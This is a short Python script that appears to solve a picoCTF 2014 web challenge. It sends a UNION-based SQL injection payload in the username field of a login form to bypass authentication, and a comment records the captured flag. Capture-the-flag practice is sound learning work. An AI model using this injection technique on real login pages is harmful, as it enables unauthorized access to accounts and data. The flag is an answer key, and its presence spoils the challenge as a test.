#!/usr/bin/env python

import requests
from pwn import *

target = 'http://web2014.picoctf.com/injection2/login.php'
payload = '''admin' AND 1=0 UNION ALL SELECT 'admin',1,'lol',2,10000;#'''
data = {
	'username': payload,
	'password': 'lol',
	'debug':1
}

r = requests.post(target, data)

print r.content

# flag: flag_nJZAKGWYt7YfzmTsCV